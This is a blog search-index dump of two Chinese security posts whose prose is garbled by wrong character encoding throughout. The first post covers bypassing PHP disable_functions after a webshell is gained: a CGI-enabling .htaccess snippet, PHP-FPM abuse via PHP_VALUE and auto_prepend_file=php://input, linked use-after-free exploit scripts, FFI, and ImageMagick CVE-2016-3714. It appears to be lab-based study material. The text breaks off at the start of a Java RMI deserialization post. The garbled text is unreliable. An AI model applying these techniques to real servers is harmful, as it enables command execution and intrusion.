ç¨‹åºå¹¶ä¸”ä½¿å¾—æœåŠ¡å™¨å°†è‡ªå®šä¹‰çš„åç¼€è§£æä¸º CGI ç¨‹åºæ‰§è¡Œï¼Œåˆ™å¯ä»¥åœ¨ç›®çš„ç›®å½•ä¸‹ä½¿ç”¨ htaccess æ–‡ä»¶è¿›è¡Œé…ç½®ï¼Œå¦‚ä¸‹ï¼š Options +ExecCGI AddHandler cgi-script .xxx è¿™æ ·ä¾¿ä¼šå°†å½“å‰ç›®å½•ä¸‹çš„æ‰€æœ‰çš„ .xxx æ–‡ä»¶å½“åš CGI ç¨‹åºæ‰§è¡Œäº†ã€‚ç”±äº CGI ç¨‹åºå¯ä»¥æ‰§è¡Œå‘½ä»¤ï¼Œé‚£æˆ‘ä»¬å¯ä»¥åˆ©ç”¨ CGI æ¥æ‰§è¡Œç³»ç»Ÿå‘½ä»¤ç»•è¿‡ disable_functionsã€‚ 5.1.3 åˆ©ç”¨ åŒæ ·åˆ©ç”¨ AntSword-Labs é‡Œçš„ç¯å¢ƒï¼šbypass_disable_functions/3 ç”¨èšå‰‘æ‹¿åˆ° shell åæ— æ³•æ‰§è¡Œå‘½ä»¤ï¼š å¼€å¯ CGIï¼š ","date":"2021-08-30","objectID":"/2021/08/%E5%B8%B8%E8%A7%81bypass-disable-functions%E6%96%B9%E6%B3%95/:5:1","tags":["æ¸—é€æµ‹è¯•"],"title":"å¸¸è§Bypass Disable Functionsæ–¹æ³•","uri":"/2021/08/%E5%B8%B8%E8%A7%81bypass-disable-functions%E6%96%B9%E6%B3%95/"},{"categories":["æ¸—é€æµ‹è¯•"],"content":"5.2 PHP-fpm 5.2.1 å‰æ Linux æ“ä½œç³»ç»Ÿ PHP-FPM å­˜åœ¨å¯å†™çš„ç›®å½•ï¼Œéœ€è¦ä¸Šä¼  .so æ–‡ä»¶ 5.2.2 åŸç† PHP-FPM æ˜¯ Fastcgi çš„åè®®è§£æå™¨ï¼ŒWeb æœåŠ¡å™¨ä½¿ç”¨ CGI åè®®å°è£…å¥½ç”¨æˆ·çš„è¯·æ±‚å‘é€ç»™ FPMã€‚FPM æŒ‰ç…§ CGI çš„åè®®å°† TCP æµè§£ææˆçœŸæ­£çš„æ•°æ®ã€‚ ä¸¾ä¸ªä¾‹å­ï¼Œç”¨æˆ·è®¿é—® http://127.0.0.1/index.php?a=1\u0026b=2 æ—¶ï¼Œå¦‚æœ web ç›®å½•æ˜¯ /var/www/htmlï¼Œé‚£ä¹ˆ Nginx ä¼šå°†è¿™ä¸ªè¯·æ±‚å˜æˆå¦‚ä¸‹ key-value å¯¹ï¼š { 'GATEWAY_INTERFACE': 'FastCGI/1.0', 'REQUEST_METHOD': 'GET', 'SCRIPT_FILENAME': '/var/www/html/index.php', 'SCRIPT_NAME': '/index.php', 'QUERY_STRING': '?a=1\u0026b=2', 'REQUEST_URI': '/index.php?a=1\u0026b=2', 'DOCUMENT_ROOT': '/var/www/html', 'SERVER_SOFTWARE': 'php/fcgiclient', 'REMOTE_ADDR': '127.0.0.1', 'REMOTE_PORT': '12345', 'SERVER_ADDR': '127.0.0.1', 'SERVER_PORT': '80', 'SERVER_NAME': \"localhost\", 'SERVER_PROTOCOL': 'HTTP/1.1' } è¿™ä¸ªæ•°ç»„å…¶å®å°±æ˜¯ PHP ä¸­ $_SERVER æ•°ç»„çš„ä¸€éƒ¨åˆ†ï¼Œä¹Ÿå°±æ˜¯ PHP é‡Œçš„ç¯å¢ƒå˜é‡ã€‚ä½†ç¯å¢ƒå˜é‡çš„ä½œç”¨ä¸ä»…æ˜¯å¡«å…… $_SERVER æ•°ç»„ï¼Œä¹Ÿæ˜¯å‘Šè¯‰ fpmï¼šè¦æ‰§è¡Œå“ªä¸ª PHP æ–‡ä»¶ã€‚ PHP-FPM æ‹¿åˆ° Fastcgi çš„æ•°æ®åŒ…åï¼Œè¿›è¡Œè§£æï¼Œå¾—åˆ°ä¸Šè¿°è¿™äº›ç¯å¢ƒå˜é‡ã€‚ç„¶åï¼Œæ‰§è¡Œ SCRIPT_FILENAME çš„å€¼æŒ‡å‘çš„ PHP æ–‡ä»¶ï¼Œä¹Ÿå°±æ˜¯ /var/www/html/index.php ã€‚ 5.2.3 åˆ©ç”¨ ç”±äº FPM é»˜è®¤ç›‘å¬çš„æ˜¯ 9000 ç«¯å£ï¼Œæˆ‘ä»¬å°±å¯ä»¥ç»•è¿‡ Web æœåŠ¡å™¨ï¼Œç›´æ¥æ„é€  Fastcgi åè®®ï¼Œå’Œ fpm è¿›è¡Œé€šä¿¡ã€‚äºæ˜¯å°±æœ‰äº†åˆ©ç”¨ Webshell ç›´æ¥ä¸ FPM é€šä¿¡ æ¥ç»•è¿‡ disable functions çš„å§¿åŠ¿ã€‚ ä½†æ˜¯ï¼Œåœ¨æ„é€  Fastcgiï¼Œå°±èƒ½æ‰§è¡Œä»»æ„ PHP ä»£ç å‰ï¼Œéœ€è¦çªç ´å‡ ä¸ªé™åˆ¶ï¼š æ—¢ç„¶æ˜¯è¯·æ±‚ï¼Œé‚£ä¹ˆ SCRIPT_FILENAME å°±ç›¸å½“çš„é‡è¦ã€‚å‰é¢è¯´è¿‡ï¼Œfpm æ˜¯æ ¹æ®è¿™ä¸ªå€¼æ¥æ‰§è¡Œ PHP æ–‡ä»¶æ–‡ä»¶çš„ï¼Œå¦‚æœä¸å­˜åœ¨ï¼Œä¼šç›´æ¥è¿”å› 404ï¼Œæ‰€ä»¥æƒ³è¦åˆ©ç”¨è¿™ä¸ªæ¼æ´ï¼Œå°±å¾—æ‰¾åˆ°ä¸€ä¸ªå·²ç»å­˜åœ¨çš„ PHP æ–‡ä»¶ã€‚åœ¨ä¸€èˆ¬è¿›è¡Œæºå®‰è£… PHP çš„æ—¶å€™ï¼ŒæœåŠ¡å™¨éƒ½ä¼šé™„å¸¦ä¸Šä¸€äº› PHP æ–‡ä»¶ï¼Œå¦‚æœè¯´æˆ‘ä»¬æ²¡æœ‰æ”¶é›†åˆ°ç›®æ ‡ Web ç›®å½•çš„ä¿¡æ¯çš„è¯ï¼Œå¯ä»¥é‡‡ç”¨è¿™ç§æ–¹æ³•ã€‚ å³ä½¿èƒ½æ§åˆ¶ SCRIPT_FILENAMEï¼Œè®© fpm æ‰§è¡Œä»»æ„æ–‡ä»¶ï¼Œä¹Ÿåªæ˜¯æ‰§è¡Œç›®æ ‡æœåŠ¡å™¨ä¸Šçš„æ–‡ä»¶ï¼Œå¹¶ä¸èƒ½æ‰§è¡Œæˆ‘ä»¬éœ€è¦å…¶æ‰§è¡Œçš„æ–‡ä»¶ã€‚é‚£è¦å¦‚ä½•ç»•è¿‡è¿™ç§é™åˆ¶å‘¢ï¼Ÿå¯ä»¥ä» php.ini å…¥æ‰‹ã€‚å®ƒæœ‰ä¸¤ä¸ªç‰¹æ®Šé€‰é¡¹ï¼Œåˆ†åˆ«æ˜¯ auto_prepend_file å’Œ auto_append_fileã€‚auto_prepend_file çš„åŠŸèƒ½æ˜¯åœ¨æ‰§è¡Œç›®æ ‡æ–‡ä»¶ä¹‹å‰ï¼Œå…ˆåŒ…å«å®ƒæŒ‡å®šçš„æ–‡ä»¶ã€‚é‚£ä¹ˆå°±æœ‰è¶£äº†ï¼Œå‡è®¾æˆ‘ä»¬è®¾ç½® auto_prepend_file ä¸ºphp://inputï¼Œé‚£ä¹ˆå°±ç­‰äºåœ¨æ‰§è¡Œä»»ä½• PHP æ–‡ä»¶å‰éƒ½è¦åŒ…å«ä¸€é POST è¿‡å»çš„å†…å®¹ã€‚æ‰€ä»¥ï¼Œåªéœ€è¦æŠŠå¾…æ‰§è¡Œçš„ä»£ç æ”¾åœ¨ POST Body ä¸­è¿›è¡Œè¿œç¨‹æ–‡ä»¶åŒ…å«ï¼Œè¿™æ ·å°±èƒ½åšåˆ°ä»»æ„ä»£ç æ‰§è¡Œäº†ã€‚ è™½ç„¶å¯ä»¥é€šè¿‡è¿œç¨‹æ–‡ä»¶åŒ…å«æ‰§è¡Œä»»æ„ä»£ç ï¼Œä½†æ˜¯è¿œç¨‹æ–‡ä»¶åŒ…å«æ˜¯æœ‰ allow_url_include è¿™ä¸ªé™åˆ¶å› ç´ çš„ï¼Œå¦‚æœæ²¡æœ‰ä¸º ON çš„è¯å°±æ²¡æœ‰åŠæ³•è¿›è¡Œè¿œç¨‹æ–‡ä»¶åŒ…å«ã€‚è¿™é‡Œï¼ŒPHP-FPM æœ‰ä¸¤ä¸ªå¯ä»¥è®¾ç½® PHP é…ç½®é¡¹çš„ KEY-VALUEï¼Œå³ PHP_VALUE å’Œ PHP_ADMIN_VALUEï¼ŒPHP_VALUEå¯ä»¥ç”¨æ¥è®¾ç½® php.iniï¼ŒPHP_ADMIN_VALUE åˆ™å¯ä»¥è®¾ç½®æ‰€æœ‰é€‰é¡¹ï¼ˆdisable_functions é€‰é¡¹é™¤å¤–ï¼‰ï¼Œè¿™æ ·å°±è§£å†³é—®é¢˜äº†ã€‚ åˆ©ç”¨ AntSword-Labs é‡Œçš„ç¯å¢ƒï¼šbypass_disable_functions/4 ç”¨èšå‰‘æ‹¿åˆ° shell åæ— æ³•æ‰§è¡Œå‘½ä»¤ï¼š æ³¨æ„è¯¥æ¨¡å¼ä¸‹éœ€è¦é€‰æ‹© PHP-FPM çš„æ¥å£åœ°å€, éœ€è¦è‡ªè¡Œæ‰¾é…ç½®æ–‡ä»¶æŸ¥ FPM æ¥å£åœ°å€ï¼Œé»˜è®¤çš„æ˜¯ unix:/// æœ¬åœ° socket è¿™ç§çš„ï¼Œå¦‚æœé…ç½®æˆ TCP çš„é»˜è®¤æ˜¯ 127.0.0.1:9000 æˆåŠŸåå¯ä»¥çœ‹åˆ° /var/www/html/ ç›®å½•ä¸‹æ–°å»ºäº†ä¸€ä¸ª .antproxy.php æ–‡ä»¶ã€‚è¿æ¥ .antproxy.phpï¼Œå°±å¯ä»¥æˆåŠŸæ‰§è¡Œå‘½ä»¤ã€‚ ","date":"2021-08-30","objectID":"/2021/08/%E5%B8%B8%E8%A7%81bypass-disable-functions%E6%96%B9%E6%B3%95/:5:2","tags":["æ¸—é€æµ‹è¯•"],"title":"å¸¸è§Bypass Disable Functionsæ–¹æ³•","uri":"/2021/08/%E5%B8%B8%E8%A7%81bypass-disable-functions%E6%96%B9%E6%B3%95/"},{"categories":["æ¸—é€æµ‹è¯•"],"content":"6 åˆ©ç”¨ UAF Bypass ","date":"2021-08-30","objectID":"/2021/08/%E5%B8%B8%E8%A7%81bypass-disable-functions%E6%96%B9%E6%B3%95/:6:0","tags":["æ¸—é€æµ‹è¯•"],"title":"å¸¸è§Bypass Disable Functionsæ–¹æ³•","uri":"/2021/08/%E5%B8%B8%E8%A7%81bypass-disable-functions%E6%96%B9%E6%B3%95/"},{"categories":["æ¸—é€æµ‹è¯•"],"content":"6.1 GC UAF 6.1.1 å‰æ Linux æ“ä½œç³»ç»Ÿ PHP 7.0 - PHP 7.3 6.1.2 åŸç† æ­¤æ¼æ´åˆ©ç”¨ PHP åƒåœ¾æ”¶é›†å™¨ä¸­å­˜åœ¨ä¸‰å¹´çš„ä¸€ä¸ª bug ï¼Œé€šè¿‡PHPåƒåœ¾æ”¶é›†å™¨ä¸­å †æº¢å‡ºæ¥ç»•è¿‡ disable_functions å¹¶æ‰§è¡Œç³»ç»Ÿå‘½ä»¤ã€‚ åˆ©ç”¨è„šæœ¬ï¼šhttps://github.com/mm0r1/exploits/tree/master/php7-gc-bypass 6.1.3 åˆ©ç”¨ èšå‰‘é¶åœº bypass_disable_functions/7 ç”¨èšå‰‘æ‹¿åˆ° shell åæ— æ³•æ‰§è¡Œå‘½ä»¤ï¼š ","date":"2021-08-30","objectID":"/2021/08/%E5%B8%B8%E8%A7%81bypass-disable-functions%E6%96%B9%E6%B3%95/:6:1","tags":["æ¸—é€æµ‹è¯•"],"title":"å¸¸è§Bypass Disable Functionsæ–¹æ³•","uri":"/2021/08/%E5%B8%B8%E8%A7%81bypass-disable-functions%E6%96%B9%E6%B3%95/"},{"categories":["æ¸—é€æµ‹è¯•"],"content":"6.2 Json Serializer UAF 6.2.1 å‰æ Linux æ“ä½œç³»ç»Ÿ PHP ç‰ˆæœ¬ 7.1 - all versions to date 7.2 \u003c 7.2.19 (released: 30 May 2019) 7.3 \u003c 7.3.6 (released: 30 May 2019) 6.2.2 åŸç† æ­¤æ¼æ´åˆ©ç”¨ json åºåˆ—åŒ–ç¨‹åºä¸­çš„é‡Šæ”¾åä½¿ç”¨æ¼æ´ï¼Œåˆ©ç”¨ json åºåˆ—åŒ–ç¨‹åºä¸­çš„å †æº¢å‡ºè§¦å‘ï¼Œä»¥ç»•è¿‡ disable_functions å’Œæ‰§è¡Œç³»ç»Ÿå‘½ä»¤ã€‚ åˆ©ç”¨è„šæœ¬ï¼šhttps://github.com/mm0r1/exploits/tree/master/php-json-bypass 6.2.3 åˆ©ç”¨ èšå‰‘é¶åœº bypass_disable_functions/6 ç”¨èšå‰‘æ‹¿åˆ° shell åæ— æ³•æ‰§è¡Œå‘½ä»¤ï¼š è­¦å‘Š è¿™ç§æ–¹å¼ä¸ä¸€å®šä¿è¯æˆåŠŸï¼Œå› æ­¤å½“é‡åˆ°å‘½ä»¤æ— å›æ˜¾ç»“æœçš„æ—¶å€™ï¼Œå¯ä»¥é‡æ–°æ‰§è¡Œã€‚ ","date":"2021-08-30","objectID":"/2021/08/%E5%B8%B8%E8%A7%81bypass-disable-functions%E6%96%B9%E6%B3%95/:6:2","tags":["æ¸—é€æµ‹è¯•"],"title":"å¸¸è§Bypass Disable Functionsæ–¹æ³•","uri":"/2021/08/%E5%B8%B8%E8%A7%81bypass-disable-functions%E6%96%B9%E6%B3%95/"},{"categories":["æ¸—é€æµ‹è¯•"],"content":"6.3 Backtrace UAF 6.3.1 å‰æ Linux æ“ä½œç³»ç»Ÿ PHP ç‰ˆæœ¬ 7.0 - all versions to date 7.1 - all versions to date 7.2 - all versions to date 7.3 \u003c 7.3.15 (released 20 Feb 2020) 7.4 \u003c 7.4.3 (released 20 Feb 2020) 6.3.2 åŸç† è¯¥æ¼æ´åˆ©ç”¨åœ¨ debug_backtrace() å‡½æ•°ä¸­ä½¿ç”¨äº†ä¸¤å¹´çš„ä¸€ä¸ª bugã€‚æˆ‘ä»¬å¯ä»¥è¯±ä½¿å®ƒè¿”å›å¯¹å·²è¢«ç ´åçš„å˜é‡çš„å¼•ç”¨ï¼Œä»è€Œå¯¼è‡´é‡Šæ”¾åä½¿ç”¨æ¼æ´ã€‚ åˆ©ç”¨è„šæœ¬ï¼šhttps://github.com/mm0r1/exploits/tree/master/php7-backtrace-bypass ","date":"2021-08-30","objectID":"/2021/08/%E5%B8%B8%E8%A7%81bypass-disable-functions%E6%96%B9%E6%B3%95/:6:3","tags":["æ¸—é€æµ‹è¯•"],"title":"å¸¸è§Bypass Disable Functionsæ–¹æ³•","uri":"/2021/08/%E5%B8%B8%E8%A7%81bypass-disable-functions%E6%96%B9%E6%B3%95/"},{"categories":["æ¸—é€æµ‹è¯•"],"content":"6.4 SplDoublyLinkedList UAF 6.4.1 å‰æ PHP ç‰ˆæœ¬ PHP v7.4.10åŠå…¶ä¹‹å‰ç‰ˆæœ¬ PHP v8.0ï¼ˆAlphaï¼‰ 6.4.2 åŸç† å…·ä½“åŸç†å‚è€ƒï¼šhttps://xz.aliyun.com/t/8355 å°†è„šæœ¬ä¸Šä¼ åˆ°ç›®æ ‡ä¸»æœºä¸Šæœ‰æƒé™çš„ç›®å½•ä¸­ï¼ˆ/var/tmp/exploit.phpï¼‰ï¼ŒåŒ…å«è¯¥ exploit.php è„šæœ¬å³å¯æˆåŠŸæ‰§è¡Œå‘½ä»¤ã€‚ ","date":"2021-08-30","objectID":"/2021/08/%E5%B8%B8%E8%A7%81bypass-disable-functions%E6%96%B9%E6%B3%95/:6:4","tags":["æ¸—é€æµ‹è¯•"],"title":"å¸¸è§Bypass Disable Functionsæ–¹æ³•","uri":"/2021/08/%E5%B8%B8%E8%A7%81bypass-disable-functions%E6%96%B9%E6%B3%95/"},{"categories":["æ¸—é€æµ‹è¯•"],"content":"7 åˆ©ç”¨ FFI æ‰©å±•æ‰§è¡Œå‘½ä»¤ ","date":"2021-08-30","objectID":"/2021/08/%E5%B8%B8%E8%A7%81bypass-disable-functions%E6%96%B9%E6%B3%95/:7:0","tags":["æ¸—é€æµ‹è¯•"],"title":"å¸¸è§Bypass Disable Functionsæ–¹æ³•","uri":"/2021/08/%E5%B8%B8%E8%A7%81bypass-disable-functions%E6%96%B9%E6%B3%95/"},{"categories":["æ¸—é€æµ‹è¯•"],"content":"7.1 å‰æ Linux æ“ä½œç³»ç»Ÿ PHP \u003e= 7.4 å¼€å¯äº† FFI æ‰©å±•ä¸” ffi.enable=true ","date":"2021-08-30","objectID":"/2021/08/%E5%B8%B8%E8%A7%81bypass-disable-functions%E6%96%B9%E6%B3%95/:7:1","tags":["æ¸—é€æµ‹è¯•"],"title":"å¸¸è§Bypass Disable Functionsæ–¹æ³•","uri":"/2021/08/%E5%B8%B8%E8%A7%81bypass-disable-functions%E6%96%B9%E6%B3%95/"},{"categories":["æ¸—é€æµ‹è¯•"],"content":"7.2 åŸç† PHP 7.4 çš„ FFIï¼ˆForeign Function Interfaceï¼‰ï¼Œå³å¤–éƒ¨å‡½æ•°æ¥å£ï¼Œå…è®¸ä»ç”¨æˆ·åœ¨ PHP ä»£ç ä¸­å»è°ƒç”¨ C ä»£ç ã€‚ ","date":"2021-08-30","objectID":"/2021/08/%E5%B8%B8%E8%A7%81bypass-disable-functions%E6%96%B9%E6%B3%95/:7:2","tags":["æ¸—é€æµ‹è¯•"],"title":"å¸¸è§Bypass Disable Functionsæ–¹æ³•","uri":"/2021/08/%E5%B8%B8%E8%A7%81bypass-disable-functions%E6%96%B9%E6%B3%95/"},{"categories":["æ¸—é€æµ‹è¯•"],"content":"7.3 åˆ©ç”¨ åˆ©ç”¨ AntSword-Labs é‡Œçš„ç¯å¢ƒï¼Œç”¨èšå‰‘æ‹¿åˆ° shell åæ— æ³•æ‰§è¡Œå‘½ä»¤ï¼š ","date":"2021-08-30","objectID":"/2021/08/%E5%B8%B8%E8%A7%81bypass-disable-functions%E6%96%B9%E6%B3%95/:7:3","tags":["æ¸—é€æµ‹è¯•"],"title":"å¸¸è§Bypass Disable Functionsæ–¹æ³•","uri":"/2021/08/%E5%B8%B8%E8%A7%81bypass-disable-functions%E6%96%B9%E6%B3%95/"},{"categories":["æ¸—é€æµ‹è¯•"],"content":"8 åˆ©ç”¨ ImageMagick ","date":"2021-08-30","objectID":"/2021/08/%E5%B8%B8%E8%A7%81bypass-disable-functions%E6%96%B9%E6%B3%95/:8:0","tags":["æ¸—é€æµ‹è¯•"],"title":"å¸¸è§Bypass Disable Functionsæ–¹æ³•","uri":"/2021/08/%E5%B8%B8%E8%A7%81bypass-disable-functions%E6%96%B9%E6%B3%95/"},{"categories":["æ¸—é€æµ‹è¯•"],"content":"8.1 å‰æ ç›®æ ‡ä¸»æœºå®‰è£…äº†æ¼æ´ç‰ˆæœ¬çš„ imagemagickï¼ˆ\u003c= 3.3.0ï¼‰ å®‰è£…äº† php-imagick æ‹“å±•å¹¶åœ¨ php.ini ä¸­å¯ç”¨ ç¼–å†™ php é€šè¿‡ new Imagick å¯¹è±¡çš„æ–¹å¼æ¥å¤„ç†å›¾ç‰‡ç­‰æ ¼å¼æ–‡ä»¶ PHP \u003e= 5.4 ","date":"2021-08-30","objectID":"/2021/08/%E5%B8%B8%E8%A7%81bypass-disable-functions%E6%96%B9%E6%B3%95/:8:1","tags":["æ¸—é€æµ‹è¯•"],"title":"å¸¸è§Bypass Disable Functionsæ–¹æ³•","uri":"/2021/08/%E5%B8%B8%E8%A7%81bypass-disable-functions%E6%96%B9%E6%B3%95/"},{"categories":["æ¸—é€æµ‹è¯•"],"content":"8.2 åŸç† åˆ©ç”¨ ImageMagick ç»•è¿‡ disable_functions çš„æ–¹æ³•åˆ©ç”¨çš„æ˜¯ ImageMagick çš„ä¸€ä¸ªæ¼æ´ï¼ˆCVE-2016-3714ï¼‰ã€‚æ¼æ´çš„åˆ©ç”¨è¿‡ç¨‹éå¸¸ç®€å•ï¼Œåªè¦å°†ç²¾å¿ƒæ„é€ çš„å›¾ç‰‡ä¸Šä¼ è‡³ä½¿ç”¨æ¼æ´ç‰ˆæœ¬çš„ ImageMagickï¼ŒImageMagick ä¼šè‡ªåŠ¨å¯¹å…¶æ ¼å¼è¿›è¡Œè½¬æ¢ï¼Œè½¬æ¢è¿‡ç¨‹ä¸­å°±ä¼šæ‰§è¡Œæ”»å‡»è€…æ’å…¥åœ¨å›¾ç‰‡ä¸­çš„å‘½ä»¤ã€‚å› æ­¤å¾ˆå¤šå…·æœ‰å¤´åƒä¸Šä¼ ã€å›¾ç‰‡è½¬æ¢ã€å›¾ç‰‡ç¼–è¾‘ç­‰å…·å¤‡å›¾ç‰‡ä¸Šä¼ åŠŸèƒ½çš„ç½‘ç«™éƒ½å¯èƒ½ä¼šä¸­æ‹›ã€‚æ‰€ä»¥å¦‚æœåœ¨ phpinfo ä¸­çœ‹åˆ°æœ‰è¿™ä¸ª ImageMagickã€‚ ","date":"2021-08-30","objectID":"/2021/08/%E5%B8%B8%E8%A7%81bypass-disable-functions%E6%96%B9%E6%B3%95/:8:2","tags":["æ¸—é€æµ‹è¯•"],"title":"å¸¸è§Bypass Disable Functionsæ–¹æ³•","uri":"/2021/08/%E5%B8%B8%E8%A7%81bypass-disable-functions%E6%96%B9%E6%B3%95/"},{"categories":["æ¸—é€æµ‹è¯•"],"content":"8.3 åˆ©ç”¨ å‚è€ƒï¼šImagetragick å‘½ä»¤æ‰§è¡Œæ¼æ´ ","date":"2021-08-30","objectID":"/2021/08/%E5%B8%B8%E8%A7%81bypass-disable-functions%E6%96%B9%E6%B3%95/:8:3","tags":["æ¸—é€æµ‹è¯•"],"title":"å¸¸è§Bypass Disable Functionsæ–¹æ³•","uri":"/2021/08/%E5%B8%B8%E8%A7%81bypass-disable-functions%E6%96%B9%E6%B3%95/"},{"categories":["æ¸—é€æµ‹è¯•"],"content":"å‚è€ƒ Bypass Disable Functions æµ…è°ˆå‡ ç§Bypass-disable-functionsçš„æ–¹æ³• bypass-disable_function-php ","date":"2021-08-30","objectID":"/2021/08/%E5%B8%B8%E8%A7%81bypass-disable-functions%E6%96%B9%E6%B3%95/:9:0","tags":["æ¸—é€æµ‹è¯•"],"title":"å¸¸è§Bypass Disable Functionsæ–¹æ³•","uri":"/2021/08/%E5%B8%B8%E8%A7%81bypass-disable-functions%E6%96%B9%E6%B3%95/"},{"categories":["ä»£ç å®¡è®¡"],"content":"ååºåˆ—åŒ–æ¶‰åŠåˆ°çš„ç›¸å…³åè®®","date":"2021-08-29","objectID":"/2021/08/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-3/","tags":["ä»£ç å®¡è®¡"],"title":"Javaååºåˆ—åŒ–æ¼æ´ç³»åˆ—-3","uri":"/2021/08/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-3/"},{"categories":["ä»£ç å®¡è®¡"],"content":"ååºåˆ—åŒ–æ”»å‡»æ¶‰åŠåˆ°çš„ç›¸å…³åè®® RMI å’Œ JNDI éƒ½æ˜¯ Java åˆ†å¸ƒå¼ä¸­è¿ç”¨è¾ƒå¤šçš„æŠ€æœ¯ï¼ŒJRMP è¿œç¨‹æ¶ˆæ¯äº¤æ¢åè®®ï¼Œè¿è¡Œäº Java RMI ä¹‹ä¸‹ï¼Œæ˜¯ä¸€ç§åº•å±‚ä¼ è¾“åè®®ã€‚ å¦‚æœæ‹¿ Web åº”ç”¨æ¥ä¸¾ä¾‹å­ï¼Œé‚£ä¹ˆ RMI å°±åƒæ˜¯ HTTP åè®®ï¼ŒJNDI å°±åƒæ˜¯ Apache HTTP Serverï¼ŒJRMP åˆ™ç›¸å½“äº TCP åè®®ã€‚HTTP å‘åç«¯è¯·æ±‚æ–‡ä»¶ï¼Œåç«¯ä¸­é—´ä»¶å®é™…ä¸Šä¸æ­¢ Apache ä¸€ç§ï¼Œè¿˜å¯ä»¥æ˜¯ IISã€Tomcat ç­‰ï¼Œè€Œåº•å±‚éƒ½æ˜¯åŸºäº TCP åè®®æ¥ä¼ è¾“æ•°æ®çš„ã€‚ ","date":"2021-08-29","objectID":"/2021/08/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-3/:0:0","tags":["ä»£ç å®¡è®¡"],"title":"Javaååºåˆ—åŒ–æ¼æ´ç³»åˆ—-3","uri":"/2021/08/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-3/"},{"categories":["ä»£ç å®¡è®¡"],"content":"1 RMI ","date":"2021-08-29","objectID":"/2021/08/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-3/:1:0","tags":["ä»£ç å®¡è®¡"],"title":"Javaååºåˆ—åŒ–æ¼æ´ç³»åˆ—-3","uri":"/2021/08/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-3/"},{"categories":["ä»£ç å®¡è®¡"],"content":"1.1 RMI åŸç† RMI å…¨ç§°æ˜¯ Remote Method Invocationï¼Œè¿œç¨‹æ–¹æ³•è°ƒç”¨ã€‚å…¶çš„â½¬æ ‡å’Œ RPC ç±»ä¼¼çš„ï¼Œæ˜¯è®©æŸä¸ª Java è™šæ‹Ÿæœºä¸Šçš„å¯¹è±¡è°ƒç”¨å¦ä¸€ä¸ª Java è™šæ‹Ÿæœºä¸­å¯¹è±¡ä¸Šçš„æ–¹æ³•ã€‚ æ•´ä¸ªè¿‡ç¨‹æœ‰ä¸‰ä¸ªç»„ç»‡å‚ä¸ï¼šClientã€Registry(æ³¨å†Œä¸­å¿ƒ)ã€Serverã€‚ RMIçš„ä¼ è¾“æ˜¯åŸºäºååºåˆ—åŒ–çš„ã€‚ å¯¹äºä»»ä½•ä¸€ä¸ªä»¥å¯¹è±¡ä¸ºå‚æ•°çš„ RMI æ¥å£ï¼Œæ„å»ºå¯¹è±¡ï¼Œä½¿æœåŠ¡å™¨ç«¯å°†å…¶æŒ‰ä»»ä½•ä¸€ä¸ªå­˜åœ¨äºæœåŠ¡ç«¯ classpath ä¸­çš„å¯åºåˆ—åŒ–ç±»æ¥ååºåˆ—åŒ–æ¢å¤å¯¹è±¡ã€‚ RMI æ¶‰åŠåˆ°å‚æ•°çš„ä¼ é€’å’Œæ‰§è¡Œç»“æœçš„è¿”å›ã€‚å‚æ•°æˆ–è€…è¿”å›å€¼å¯ä»¥æ˜¯åŸºæœ¬æ•°æ®ç±»å‹ï¼Œå½“ç„¶ä¹Ÿæœ‰å¯èƒ½æ˜¯å¯¹è±¡çš„å¼•ç”¨ã€‚æ‰€ä»¥è¿™äº›éœ€è¦è¢«ä¼ è¾“çš„å¯¹è±¡å¿…é¡»å¯ä»¥è¢«åºåˆ—åŒ–ï¼Œè¿™è¦æ±‚ç›¸åº”çš„ç±»å¿…é¡»å®ç° java.io.Serializable æ¥å£ï¼Œå¹¶ä¸”å®¢æˆ·ç«¯çš„ serialVersionUID å­—æ®µè¦ä¸æœåŠ¡å™¨ç«¯ä¿æŒä¸€è‡´ã€‚ é—®é¢˜ ä»€ä¹ˆæ˜¯ Stubï¼Ÿ æ¯ä¸ªè¿œç¨‹å¯¹è±¡éƒ½åŒ…å«ä¸€ä¸ªä»£ç†å¯¹è±¡ Stubï¼Œå½“è¿è¡Œåœ¨æœ¬åœ° Java è™šæ‹Ÿæœºä¸Šçš„ç¨‹åºè°ƒç”¨è¿è¡Œåœ¨è¿œç¨‹ Java è™šæ‹Ÿæœºä¸Šçš„å¯¹è±¡æ–¹æ³•æ—¶ï¼Œå®ƒé¦–å…ˆåœ¨æœ¬åœ°åˆ›å»ºè¯¥å¯¹è±¡çš„ä»£ç†å¯¹è±¡ Stubï¼Œç„¶åè°ƒç”¨ä»£ç†å¯¹è±¡ä¸ŠåŒ¹é…çš„æ–¹æ³•ã€‚ Stub å¯¹è±¡è´Ÿè´£è°ƒç”¨å‚æ•°å’Œè¿”å›å€¼çš„æµåŒ–(Serialization)ã€æ‰“åŒ…è§£åŒ…ï¼Œä»¥åŠç½‘ç»œå±‚çš„é€šè®¯è¿‡ç¨‹ã€‚ ä»€ä¹ˆæ˜¯ Skeletonï¼Ÿ æ¯ä¸€ä¸ªè¿œç¨‹å¯¹è±¡åŒæ—¶ä¹ŸåŒ…å«ä¸€ä¸ª Skeleton å¯¹è±¡ï¼ŒSkeleton è¿è¡Œåœ¨è¿œç¨‹å¯¹è±¡æ‰€åœ¨çš„è™šæ‹Ÿæœºä¸Šï¼Œæ¥å—æ¥è‡ª stub å¯¹è±¡çš„è°ƒç”¨ã€‚ RMI ä¸­çš„åŸºæœ¬æ“ä½œï¼š lookup bind unbind list rebind ","date":"2021-08-29","objectID":"/2021/08/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-3/:1:1","tags":["ä»£ç å®¡è®¡"],"title":"Javaååºåˆ—åŒ–æ¼æ´ç³»åˆ—-3","uri":"/2021/08/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-3/"},{"categories":["ä»£ç å®¡è®¡"],"content":"1.2 æ¨¡æ‹Ÿ Java RMI åˆ©ç”¨è¿‡ç¨‹ 1.2.1 RMI Server package com.geekby.javarmi; import java.rmi.Naming; import java.rmi.Remote; import 